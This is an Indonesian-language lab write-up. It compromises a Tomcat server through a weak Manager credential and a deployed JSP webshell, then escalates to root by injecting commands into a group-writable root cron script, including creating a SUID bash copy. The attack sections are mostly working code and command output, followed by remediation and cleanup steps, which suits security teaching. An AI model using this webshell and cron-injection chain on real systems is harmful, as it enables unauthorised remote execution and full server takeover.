# Write-up Privilege Escalation Lab Catalina

## 1. Ringkasan

Target lab bernama **Catalina** berhasil dieksploitasi melalui rangkaian kelemahan berikut:

```text
Tomcat Manager exposed
→ default/weak credential tomcat:s3cret
→ deploy WAR webshell
→ command execution sebagai user tomcat
→ cron job root menjalankan script yang writable oleh group tomcat
→ privilege escalation ke root
```

Target berada pada:

```text
IP   : 192.168.56.117
Port : 8081/tcp
Host : catalina
User awal setelah RCE : tomcat
Privilege akhir       : root
```

Temuan utama adalah **Apache Tomcat Manager dapat diakses menggunakan credential lemah/default**, lalu akses tersebut digunakan untuk melakukan deployment file WAR berisi JSP command execution.

Setelah mendapatkan shell sebagai user `tomcat`, ditemukan cron job root yang menjalankan `/opt/backup/backup.sh` setiap menit. File tersebut dimiliki oleh `root`, tetapi group-nya adalah `tomcat` dan memiliki permission write untuk group, sehingga user `tomcat` dapat menyisipkan command yang dieksekusi oleh root.

---

## 2. Reconnaissance dan Service Enumeration

Langkah awal dilakukan dengan memastikan target dapat dijangkau:

```bash
ping -c 4 192.168.56.117
```

Hasil ping menunjukkan target aktif dan dapat dijangkau dari mesin attacker.

Selanjutnya dilakukan directory brute force menggunakan `dirsearch` pada port `8081`:

```bash
dirsearch -u 192.168.56.117:8081
```

Hasil penting dari `dirsearch`:

```text
302 - /manager  ->  /manager/
302 - /manager/ ->  /manager/html
401 - /manager/html
401 - /manager/jmxproxy
401 - /manager/status/all
```

Temuan tersebut menunjukkan bahwa **Tomcat Manager** aktif dan terlindungi HTTP Basic Authentication.

Path berikut menjadi indikator penting:

```text
/manager/html
/manager/jmxproxy
/manager/status/all
```

Validasi manual dilakukan dengan:

```bash
curl -i http://192.168.56.117:8081/manager/html
```

Respons menunjukkan:

```text
HTTP/1.1 401
WWW-Authenticate: Basic realm="Tomcat Manager Application"
```

Artinya halaman Tomcat Manager aktif dan membutuhkan autentikasi.

---

## 3. Vulnerability Scanning dengan Nikto

Scanning menggunakan Nikto:

```bash
nikto -h http://192.168.56.117:8081
```

Hasil penting:

```text
/manager/html: Default account found for 'Tomcat Manager Application'
ID 'tomcat', PW 's3cret'
/manager/html: Tomcat Manager / Host Manager interface found
/manager/status: Tomcat Server Status interface found
```

Temuan ini menunjukkan adanya credential lemah/default:

```text
Username : tomcat
Password : s3cret
```

Credential tersebut kemudian divalidasi menggunakan endpoint Tomcat Manager.

---

## 4. Validasi Credential Tomcat Manager

Validasi dilakukan dengan mengakses text interface Tomcat Manager:

```bash
curl -s -u tomcat:s3cret http://192.168.56.117:8081/manager/text/list
```

Hasil:

```text
OK - Listed applications for virtual host [localhost]
/:running:0:ROOT
/manager:running:3:manager
```

Validasi informasi server:

```bash
curl -s -u tomcat:s3cret http://192.168.56.117:8081/manager/text/serverinfo
```

Contoh hasil:

```text
OK - Server info
Tomcat Version: [Server]
OS Name: [Linux]
OS Version: [5.15.0-178-generic]
OS Architecture: [amd64]
JVM Version: [17.0.19+10-1-22.04.2-Ubuntu]
```

Kesimpulan:

```text
Credential tomcat:s3cret valid.
User memiliki akses ke Tomcat Manager text interface.
```

---

## 5. Exploitation: Deploy WAR Webshell

Karena credential Tomcat Manager valid, attacker dapat membuat file WAR berisi JSP command execution.

Buat direktori kerja:

```bash
mkdir -p ~/tomcat-lab/labcmd
cd ~/tomcat-lab/labcmd
```

Buat file `cmd.jsp`:

```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    String[] command = {"/bin/sh", "-c", cmd};
    Process p = Runtime.getRuntime().exec(command);
    InputStream in = p.getInputStream();
    InputStream err = p.getErrorStream();

    byte[] buffer = new byte[4096];
    int len;

    out.println("<pre>");
    while ((len = in.read(buffer)) != -1) {
        out.write(new String(buffer, 0, len));
    }
    while ((len = err.read(buffer)) != -1) {
        out.write(new String(buffer, 0, len));
    }
    out.println("</pre>");
}
%>
```

Package menjadi file WAR:

```bash
zip -r labcmd.war cmd.jsp
```

Deploy ke Tomcat Manager:

```bash
curl -u tomcat:s3cret --upload-file labcmd.war \
"http://192.168.56.117:8081/manager/text/deploy?path=/labcmd&update=true"
```

Hasil:

```text
OK - Deployed application at context path [/labcmd]
```

Validasi command execution:

```bash
curl "http://192.168.56.117:8081/labcmd/cmd.jsp?cmd=id"
```

Hasil:

```text
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```

Dengan demikian, attacker berhasil mendapatkan **Remote Command Execution sebagai user `tomcat`**.

---

## 6. Local Enumeration

Setelah mendapatkan RCE, dilakukan enumerasi identitas user:

```bash
curl -G --data-urlencode "cmd=id; whoami; groups; pwd; hostname" \
http://192.168.56.117:8081/labcmd/cmd.jsp
```

Hasil:

```text
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
tomcat
tomcat
/
catalina
```

Kesimpulan:

```text
User saat ini : tomcat
Group         : tomcat
Hostname      : catalina
Privilege     : non-root
```

Dari sini, tahap berikutnya adalah mencari jalur privilege escalation dari user `tomcat` ke `root`.

---

## 7. Pemeriksaan Apakah Target Container

Karena hostname target adalah `catalina`, perlu dicek apakah target berjalan sebagai container.

Command:

```bash
curl -G --data-urlencode "cmd=cat /proc/1/cgroup; ls -la /.dockerenv 2>/dev/null; hostname; mount | head -50" \
http://192.168.56.117:8081/labcmd/cmd.jsp
```

Hasil penting:

```text
0::/init.scope
catalina
/dev/sda2 on / type ext4 (rw,relatime)
```

Tidak ditemukan `/.dockerenv`, tidak ada mount `overlay`, dan root filesystem berasal dari `/dev/sda2`.

Kesimpulan:

```text
Target kemungkinan besar bukan Docker container.
Fokus privilege escalation diarahkan ke Linux local misconfiguration.
```

---

## 8. Enumeration Cron Job

Pemeriksaan cron dilakukan dengan membaca `/etc/crontab` dan direktori cron:

```bash
curl -G --data-urlencode \
"cmd=cat /etc/crontab 2>/dev/null; ls -lah /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly 2>/dev/null" \
http://192.168.56.117:8081/labcmd/cmd.jsp
```

Ditemukan file custom cron:

```text
/etc/cron.d/backup
```

Isi file cron:

```bash
curl -G --data-urlencode "cmd=cat /etc/cron.d/backup; echo; stat -c '%A %U %G %n' /etc/cron.d/backup" \
http://192.168.56.117:8081/labcmd/cmd.jsp
```

Hasil:

```text
* * * * * root /opt/backup/backup.sh

-rw-r--r-- root root /etc/cron.d/backup
```

Artinya, setiap menit sistem menjalankan script berikut sebagai `root`:

```text
/opt/backup/backup.sh
```

File cron sendiri dimiliki oleh `root` dan tidak writable oleh `tomcat`. Namun hal penting berikutnya adalah permission dari script yang dipanggil oleh cron.

---

## 9. Analisis Permission Script Backup

Permission `/opt/backup/backup.sh` diperiksa:

```bash
curl -G --data-urlencode \
"cmd=ls -lah /opt /opt/backup /opt/backup/backup.sh; stat -c '%A %U %G %n' /opt /opt/backup /opt/backup/backup.sh; cat /opt/backup/backup.sh" \
http://192.168.56.117:8081/labcmd/cmd.jsp
```

Hasil penting:

```text
-rwxrwxr-x 1 root tomcat 26 Jun 28 10:26 /opt/backup/backup.sh
-rwxrwxr-x root tomcat /opt/backup/backup.sh

#!/bin/bash
# backup task
```

Analisis permission:

```text
Owner : root
Group : tomcat
Mode  : rwxrwxr-x
```

Karena user saat ini adalah `tomcat` dan file memiliki permission `group write`, user `tomcat` dapat mengubah isi `/opt/backup/backup.sh`.

Ini adalah konfigurasi berbahaya karena file tersebut dijalankan oleh cron sebagai `root` setiap menit.

---

## 10. Proof of Privilege Escalation

Sebagai pembuktian non-destruktif, attacker menyisipkan command untuk menulis hasil `id` ke `/tmp/root_proof`.

Backup script asli terlebih dahulu:

```bash
curl -G --data-urlencode "cmd=cp /opt/backup/backup.sh /tmp/backup.sh.bak" \
http://192.168.56.117:8081/labcmd/cmd.jsp
```

Tambahkan proof command:

```bash
curl -G --data-urlencode \
"cmd=printf '\nid > /tmp/root_proof\n' >> /opt/backup/backup.sh" \
http://192.168.56.117:8081/labcmd/cmd.jsp
```

Tunggu cron berjalan sekitar 1 menit, lalu cek:

```bash
curl -G --data-urlencode \
"cmd=cat /tmp/root_proof; ls -lah /tmp/root_proof" \
http://192.168.56.117:8081/labcmd/cmd.jsp
```

Hasil yang diharapkan:

```text
uid=0(root) gid=0(root) groups=0(root)
-rw-r--r-- 1 root root 39 Jul 9 12:59 /tmp/root_proof
```

Hasil tersebut membuktikan bahwa command yang ditambahkan oleh user `tomcat` ke dalam `/opt/backup/backup.sh` dieksekusi sebagai `root` oleh cron.

---

## 11. Mendapatkan Root Shell melalui SUID Bash

Untuk mendapatkan akses root yang lebih mudah, attacker menyisipkan payload untuk membuat salinan `/bin/bash` dengan bit SUID.

Command:

```bash
curl -G --data-urlencode \
"cmd=printf '\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' >> /opt/backup/backup.sh" \
http://192.168.56.117:8081/labcmd/cmd.jsp
```

Tunggu cron berjalan sekitar 1 menit, lalu cek permission file `/tmp/rootbash`:

```bash
curl -G --data-urlencode \
"cmd=ls -lah /tmp/rootbash" \
http://192.168.56.117:8081/labcmd/cmd.jsp
```

Hasil yang diharapkan:

```text
-rwsr-xr-x 1 root root 1.4M Jul 9 13:00 /tmp/rootbash
```

Permission `rws` menunjukkan bahwa file memiliki SUID bit dan owner-nya adalah `root`.

Eksekusi root shell:

```bash
curl -G --data-urlencode \
"cmd=/tmp/rootbash -p -c 'id; whoami; hostname'" \
http://192.168.56.117:8081/labcmd/cmd.jsp
```

Hasil:

```text
uid=997(tomcat) gid=997(tomcat) euid=0(root) groups=997(tomcat)
root
catalina
```

Bagian terpenting:

```text
euid=0(root)
```

Artinya privilege escalation berhasil. User efektif sudah menjadi `root`, meskipun real user masih `tomcat`.

---

## 12. Root Cause

Root cause dari privilege escalation ini adalah **kesalahan permission pada script yang dijalankan oleh root melalui cron**.

File:

```text
/opt/backup/backup.sh
```

memiliki konfigurasi:

```text
Owner : root
Group : tomcat
Mode  : rwxrwxr-x
```

Karena group `tomcat` memiliki hak tulis terhadap file tersebut, maka service account `tomcat` dapat memodifikasi script yang dijalankan oleh `root`.

Kesalahan ini menjadi kritikal karena sebelumnya attacker sudah memperoleh command execution sebagai user `tomcat` melalui Tomcat Manager.

---

## 13. Impact

Dampak dari rangkaian kelemahan ini adalah:

1. Attacker dapat login ke Tomcat Manager menggunakan credential lemah/default.
2. Attacker dapat melakukan deploy WAR berbahaya.
3. Attacker memperoleh command execution sebagai user `tomcat`.
4. Attacker dapat memodifikasi script backup yang dijalankan oleh root.
5. Attacker dapat melakukan privilege escalation ke root.
6. Attacker berpotensi mengambil alih penuh server.

Severity:

```text
Critical
```

Alasan severity kritikal:

```text
Eksploitasi berhasil dari akses web application management menjadi full root access pada host.
```

---

## 14. Kill Chain

```text
1. Discovery
   Target 192.168.56.117:8081 ditemukan aktif.

2. Enumeration
   /manager/html ditemukan melalui dirsearch.

3. Credential Weakness
   Nikto menemukan credential Tomcat Manager tomcat:s3cret.

4. Initial Access
   Login Tomcat Manager berhasil.

5. Execution
   WAR webshell di-deploy ke /labcmd.

6. Local Enumeration
   Command execution berjalan sebagai uid=997(tomcat).

7. Privilege Escalation
   Cron root menjalankan /opt/backup/backup.sh setiap menit.

8. Misconfiguration Abuse
   /opt/backup/backup.sh writable oleh group tomcat.

9. Root Access
   Cron menjalankan payload attacker sebagai root.

10. Proof
   /tmp/root_proof dibuat oleh root dan /tmp/rootbash memiliki SUID root.
```

---

## 15. Evidence Penting

| No | Evidence | Hasil |
|---:|---|---|
| 1 | Dirsearch | `/manager/html`, `/manager/jmxproxy`, `/manager/status/all` ditemukan |
| 2 | Nikto | Default credential `tomcat:s3cret` ditemukan |
| 3 | Tomcat Manager | `/manager/text/list` berhasil dengan credential tersebut |
| 4 | WAR Deploy | `OK - Deployed application at context path [/labcmd]` |
| 5 | RCE | `uid=997(tomcat) gid=997(tomcat)` |
| 6 | Cron | `* * * * * root /opt/backup/backup.sh` |
| 7 | Permission | `/opt/backup/backup.sh` = `-rwxrwxr-x root tomcat` |
| 8 | Root proof | `/tmp/root_proof` berisi `uid=0(root)` |
| 9 | Root shell | `/tmp/rootbash` memiliki permission `-rwsr-xr-x root root` |
| 10 | Final proof | `euid=0(root)` saat menjalankan `/tmp/rootbash -p` |

---

## 16. Rekomendasi Perbaikan

### A. Perbaikan Tomcat Manager

1. Hapus credential default/lemah seperti `tomcat:s3cret`.
2. Gunakan password kuat dan unik.
3. Batasi akses `/manager` hanya dari IP administrator.
4. Jangan expose Tomcat Manager ke jaringan yang tidak tepercaya.
5. Pisahkan role Tomcat Manager sesuai prinsip least privilege.
6. Nonaktifkan Tomcat Manager jika tidak diperlukan.
7. Letakkan akses manajemen di belakang VPN atau bastion host.

Contoh hardening `tomcat-users.xml`:

```xml
<role rolename="manager-gui"/>
<user username="admin-tomcat" password="PASSWORD_KUAT_UNIK" roles="manager-gui"/>
```

Hindari memberi satu user terlalu banyak role seperti:

```text
manager-gui + manager-script + manager-jmx
```

kecuali benar-benar diperlukan.

### B. Perbaikan Cron dan Permission Script

Ubah ownership dan permission script backup:

```bash
chown root:root /opt/backup/backup.sh
chmod 750 /opt/backup/backup.sh
```

Atau lebih ketat:

```bash
chmod 700 /opt/backup/backup.sh
```

Pastikan direktori `/opt/backup` juga tidak writable oleh service account aplikasi:

```bash
chown root:root /opt/backup
chmod 750 /opt/backup
```

### C. Prinsip Umum

1. Jangan menjalankan script root dari lokasi yang dapat ditulis oleh user aplikasi.
2. Jangan memberi permission write kepada group aplikasi untuk file yang dieksekusi root.
3. Pisahkan user service aplikasi dari user operasional sistem.
4. Audit cron job secara berkala.
5. Audit file writable oleh user aplikasi.
6. Terapkan prinsip least privilege.
7. Monitoring perubahan file sensitif seperti `/etc/cron*`, `/opt`, `/usr/local/bin`, dan script operasional.

---

## 17. Cleanup Lab

Setelah pengujian selesai, lakukan cleanup agar lab kembali bersih.

Kembalikan script backup jika sebelumnya sudah dibackup:

```bash
cp /tmp/backup.sh.bak /opt/backup/backup.sh
```

Hapus file proof dan rootbash:

```bash
/tmp/rootbash -p -c 'rm -f /tmp/root_proof /tmp/rootbash /tmp/backup.sh.bak'
```

Undeploy webshell dari Tomcat Manager:

```bash
curl -u tomcat:s3cret \
"http://192.168.56.117:8081/manager/text/undeploy?path=/labcmd"
```

Validasi aplikasi sudah terhapus:

```bash
curl -s -u tomcat:s3cret \
http://192.168.56.117:8081/manager/text/list
```

---

## 18. Kesimpulan

Lab Catalina berhasil dikompromikan melalui kombinasi kelemahan konfigurasi aplikasi dan sistem operasi.

Akses awal diperoleh dari Tomcat Manager yang terekspos dan menggunakan credential lemah/default `tomcat:s3cret`. Credential tersebut memungkinkan deployment WAR webshell dan menghasilkan command execution sebagai user `tomcat`.

Selanjutnya, privilege escalation berhasil dilakukan karena terdapat cron job root yang menjalankan `/opt/backup/backup.sh` setiap menit, sementara script tersebut writable oleh group `tomcat`.

Kesimpulan akhir:

```text
Initial Access : Tomcat Manager default/weak credential
Execution      : WAR webshell deployment
User awal      : tomcat
Privesc        : writable root cron script
User akhir     : root
Severity       : Critical
```
